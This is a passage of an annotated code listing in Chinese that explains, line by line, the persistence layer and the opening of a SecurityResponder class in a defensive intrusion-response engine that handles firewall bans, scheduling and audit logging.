| 112 | 函数定义：声明 `fetch_due_tasks` 的输入、处理逻辑和返回结果。 | `    def fetch_due_tasks(self, *, before: datetime, limit: int = 50) -> List[ScheduleTaskRow]:` |
| 113 | 返回结果：把处理后的值交回调用方。 | `        return []` |
| 114 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 115 | 函数定义：声明 `update_schedule_task` 的输入、处理逻辑和返回结果。 | `    def update_schedule_task(` |
| 116 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task_id: int,` |
| 118 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempt_count: Optional[int] = None,` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        last_error: Optional[str] = None,` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: Optional[datetime] = None,` |
| 123 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 124 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 函数定义：声明 `append_audit_db_event` 的输入、处理逻辑和返回结果。 | `    def append_audit_db_event(` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event_type: str,` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Optional[Dict[str, Any]] = None,` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        resource_id: Optional[str] = None,` |
| 132 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 133 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 136 | 类定义：声明 `FlaskSqlalchemyResponsePersistence`，封装相关状态与行为。 | `class FlaskSqlalchemyResponsePersistence(ResponsePersistence):` |
| 137 | 文档字符串：说明当前模块、类或函数的职责。 | `    """使用独立 Flask app 上下文绑定 SQLAlchemy。"""` |
| 138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 139 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, app: Flask) -> None:` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._app = app` |
| 141 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 142 | 装饰器：为下面的函数或类附加框架行为。 | `    @contextmanager` |
| 143 | 函数定义：声明 `_write` 的输入、处理逻辑和返回结果。 | `    def _write(self) -> Iterator[None]:` |
| 144 | 上下文管理：自动管理资源打开与释放。 | `        with self._app.app_context():` |
| 145 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 146 | 代码语句：参与当前文件的业务流程或数据处理。 | `                yield` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.commit()` |
| 148 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.rollback()` |
| 150 | 代码语句：参与当前文件的业务流程或数据处理。 | `                raise` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 装饰器：为下面的函数或类附加框架行为。 | `    @contextmanager` |
| 153 | 函数定义：声明 `_read` 的输入、处理逻辑和返回结果。 | `    def _read(self) -> Iterator[None]:` |
| 154 | 上下文管理：自动管理资源打开与释放。 | `        with self._app.app_context():` |
| 155 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 156 | 代码语句：参与当前文件的业务流程或数据处理。 | `                yield` |
| 157 | 收尾逻辑：无论是否异常都会执行清理。 | `            finally:` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.rollback()` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 函数定义：声明 `save_response_action` 的输入、处理逻辑和返回结果。 | `    def save_response_action(` |
| 161 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 162 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action_type: str,` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target: Optional[str],` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool,` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        error: Optional[str] = None,` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        scheduled_unblock_at: Optional[datetime] = None,` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Optional[Dict[str, Any]] = None,` |
| 171 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 172 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import ResponseAction` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 上下文管理：自动管理资源打开与释放。 | `        with self._write():` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = ResponseAction(` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=alert_id,` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type=action_type,` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=target,` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status=status,` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=dry_run,` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                error=error,` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                scheduled_unblock_at=scheduled_unblock_at,` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta=meta,` |
| 184 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 185 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.add(row)` |
| 186 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.flush()` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rid = int(row.id)` |
| 188 | 返回结果：把处理后的值交回调用方。 | `        return rid` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 函数定义：声明 `enqueue_schedule_task` 的输入、处理逻辑和返回结果。 | `    def enqueue_schedule_task(` |
| 191 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 192 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task_type: str,` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: datetime,` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Dict[str, Any],` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        related_response_action_id: Optional[int] = None,` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_attempts: int = 5,` |
| 199 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 200 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import ResponseScheduleTask` |
| 201 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 202 | 上下文管理：自动管理资源打开与释放。 | `        with self._write():` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = ResponseScheduleTask(` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                task_type=task_type,` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=alert_id,` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                payload=payload,` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                run_at=run_at,` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="pending",` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                max_attempts=max_attempts,` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                related_response_action_id=related_response_action_id,` |
| 211 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 212 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.add(row)` |
| 213 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.flush()` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            tid = int(row.id)` |
| 215 | 返回结果：把处理后的值交回调用方。 | `        return tid` |
| 216 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 217 | 函数定义：声明 `fetch_due_tasks` 的输入、处理逻辑和返回结果。 | `    def fetch_due_tasks(self, *, before: datetime, limit: int = 50) -> List[ScheduleTaskRow]:` |
| 218 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import ResponseScheduleTask` |
| 219 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 220 | 上下文管理：自动管理资源打开与释放。 | `        with self._read():` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            q = (` |
| 222 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.query(ResponseScheduleTask)` |
| 223 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .filter(` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    ResponseScheduleTask.status == "pending",` |
| 225 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ResponseScheduleTask.run_at <= before,` |
| 226 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 227 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .order_by(ResponseScheduleTask.run_at.asc())` |
| 228 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .limit(limit)` |
| 229 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 230 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rows = list(q)` |
| 231 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            out = [` |
| 232 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ScheduleTaskRow(` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    id=int(r.id),` |
| 234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    task_type=r.task_type,` |
| 235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    alert_id=r.alert_id,` |
| 236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    payload=dict(r.payload or {}),` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    run_at=r.run_at,` |
| 238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status=r.status,` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    attempt_count=int(r.attempt_count or 0),` |
| 240 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    max_attempts=int(r.max_attempts or 5),` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    related_response_action_id=r.related_response_action_id,` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    last_error=r.last_error,` |
| 243 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 244 | 循环：逐个处理集合或迭代器中的元素。 | `                for r in rows` |
| 245 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ]` |
| 246 | 返回结果：把处理后的值交回调用方。 | `        return out` |
| 247 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 248 | 函数定义：声明 `update_schedule_task` 的输入、处理逻辑和返回结果。 | `    def update_schedule_task(` |
| 249 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task_id: int,` |
| 251 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 253 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempt_count: Optional[int] = None,` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        last_error: Optional[str] = None,` |
| 255 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: Optional[datetime] = None,` |
| 256 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 257 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import ResponseScheduleTask` |
| 258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 259 | 上下文管理：自动管理资源打开与释放。 | `        with self._write():` |
| 260 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = db.session.get(ResponseScheduleTask, task_id)` |
| 261 | 条件判断：满足条件时进入对应分支。 | `            if row is None:` |
| 262 | 返回结果：把处理后的值交回调用方。 | `                return` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row.status = status` |
| 264 | 条件判断：满足条件时进入对应分支。 | `            if attempt_count is not None:` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.attempt_count = attempt_count` |
| 266 | 条件判断：满足条件时进入对应分支。 | `            if last_error is not None:` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.last_error = last_error` |
| 268 | 条件判断：满足条件时进入对应分支。 | `            if run_at is not None:` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.run_at = run_at` |
| 270 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 271 | 函数定义：声明 `append_audit_db_event` 的输入、处理逻辑和返回结果。 | `    def append_audit_db_event(` |
| 272 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 273 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event_type: str,` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Optional[Dict[str, Any]] = None,` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        resource_id: Optional[str] = None,` |
| 277 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 278 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import AuditEvent` |
| 279 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 280 | 上下文管理：自动管理资源打开与释放。 | `        with self._write():` |
| 281 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.add(` |
| 282 | 函数调用：执行已有函数/方法完成当前步骤。 | `                AuditEvent(` |
| 283 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    event_type=event_type,` |
| 284 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    resource_type="response",` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    resource_id=resource_id,` |
| 286 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    payload=payload or {},` |
| 287 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 288 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 289 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 290 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 291 | 函数定义：声明 `build_persistence_app` 的输入、处理逻辑和返回结果。 | `def build_persistence_app(database_url: str) -> Flask:` |
| 292 | 文档字符串：说明当前模块、类或函数的职责。 | `    """创建仅用于响应持久化的 Flask 应用（注册 ORM）。"""` |
| 293 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import web.models  # noqa: F401 - register ORM mappers` |
| 294 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 295 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = Flask(__name__)` |
| 296 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["SQLALCHEMY_DATABASE_URI"] = database_url` |
| 297 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False` |
| 298 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "response-persistence-key")` |
| 299 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.init_app(app)` |
| 300 | 返回结果：把处理后的值交回调用方。 | `    return app` |
| 301 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 302 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 303 | 函数定义：声明 `create_response_persistence_from_env` 的输入、处理逻辑和返回结果。 | `def create_response_persistence_from_env() -> ResponsePersistence:` |
| 304 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    uri = os.environ.get("DATABASE_URL", "").strip()` |
| 305 | 条件判断：满足条件时进入对应分支。 | `    if not uri:` |
| 306 | 返回结果：把处理后的值交回调用方。 | `        return NullResponsePersistence()` |
| 307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = build_persistence_app(uri)` |
| 308 | 返回结果：把处理后的值交回调用方。 | `    return FlaskSqlalchemyResponsePersistence(app)` |

## `src/response/responder.py`

- 类型：自动响应
- 行数：571

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `防护响应引擎（R4：通知、FirewallManager、调度、持久化与审计）。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timedelta, timezone` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Callable, Dict, List, Optional` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import DetectionResult` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.firewall import FirewallManager, firewall_manager_from_env` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.host_isolation import (` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    HostIsolationProvider,` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    NullHostIsolationProvider,` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    host_isolation_from_env,` |
| 16 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.ip_policy import check_real_ban_eligibility` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.ip_validate import validate_ip` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.notifier import AlertNotifier` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.persistence import ResponsePersistence, create_response_persistence_from_env` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.scheduler import ResponseScheduler` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_HIGH_BAN_DURATION = timedelta(hours=1)` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CRITICAL_BAN_DURATION = timedelta(days=1)` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 类定义：声明 `SecurityResponder`，封装相关状态与行为。 | `class SecurityResponder:` |
| 30 | 文档字符串：说明当前模块、类或函数的职责。 | `    """分级响应：high/critical 走可审计、可回滚、可降级路径。"""` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool = True,` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        firewall: Optional[FirewallManager] = None,` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        notifier: Optional[AlertNotifier] = None,` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        isolation: Optional[HostIsolationProvider] = None,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        persistence: Optional[ResponsePersistence] = None,` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        scheduler: Optional[ResponseScheduler] = None,` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        security_logger: Optional[Any] = None,` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id_from_result: Optional[Callable[[DetectionResult], Optional[str]]] = None,` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.dry_run = dry_run` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._firewall = firewall or firewall_manager_from_env()` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._notifier = notifier if notifier is not None else AlertNotifier.from_env()` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._isolation = isolation if isolation is not None else host_isolation_from_env()` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._persistence = persistence or create_response_persistence_from_env()` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._scheduler = scheduler or ResponseScheduler(self._persistence)` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._security_logger = security_logger` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._alert_id_from_result = alert_id_from_result` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._banned_ips: Dict[str, datetime] = {}` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._response_actions: List[Dict[str, Any]] = []` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 57 | 函数定义：声明 `scheduler` 的输入、处理逻辑和返回结果。 | `    def scheduler(self) -> ResponseScheduler:` |
| 58 | 返回结果：把处理后的值交回调用方。 | `        return self._scheduler` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 61 | 函数定义：声明 `response_actions` 的输入、处理逻辑和返回结果。 | `    def response_actions(self) -> List[Dict[str, Any]]:` |
| 62 | 返回结果：把处理后的值交回调用方。 | `        return list(self._response_actions)` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 函数定义：声明 `_alert_id` 的输入、处理逻辑和返回结果。 | `    def _alert_id(self, result: DetectionResult) -> Optional[str]:` |
| 65 | 条件判断：满足条件时进入对应分支。 | `        if self._alert_id_from_result:` |
| 66 | 返回结果：把处理后的值交回调用方。 | `            return self._alert_id_from_result(result)` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw = result.raw_data or {}` |
| 68 | 条件判断：满足条件时进入对应分支。 | `        if isinstance(raw, dict):` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            aid = raw.get("alert_id")` |
| 70 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(aid, str) and aid.strip():` |
| 71 | 返回结果：把处理后的值交回调用方。 | `                return aid.strip()` |
| 72 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 函数定义：声明 `_append_memory_action` 的输入、处理逻辑和返回结果。 | `    def _append_memory_action(self, action: Dict[str, Any]) -> None:` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = dict(action)` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `        row.setdefault("recorded_at", datetime.now(timezone.utc).isoformat(timespec="seconds"))` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._response_actions.append(row)` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 函数定义：声明 `_persist_action` 的输入、处理逻辑和返回结果。 | `    def _persist_action(` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action_type: str,` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target: Optional[str],` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool,` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        error: Optional[str] = None,` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        scheduled_unblock_at: Optional[datetime] = None,` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Optional[Dict[str, Any]] = None,` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rid = self._persistence.save_response_action(` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            action_type=action_type,` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=target,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status=status,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=dry_run,` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            error=error,` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            scheduled_unblock_at=scheduled_unblock_at,` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            meta=meta,` |
| 100 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 101 | 返回结果：把处理后的值交回调用方。 | `        return rid` |
| 102 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 103 | 函数定义：声明 `_audit` 的输入、处理逻辑和返回结果。 | `    def _audit(` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action: str,` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target: str,` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result: str,` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extra: Optional[Dict[str, Any]] = None,` |
| 110 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 111 | 条件判断：满足条件时进入对应分支。 | `        if self._security_logger is None:` |
| 112 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 113 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
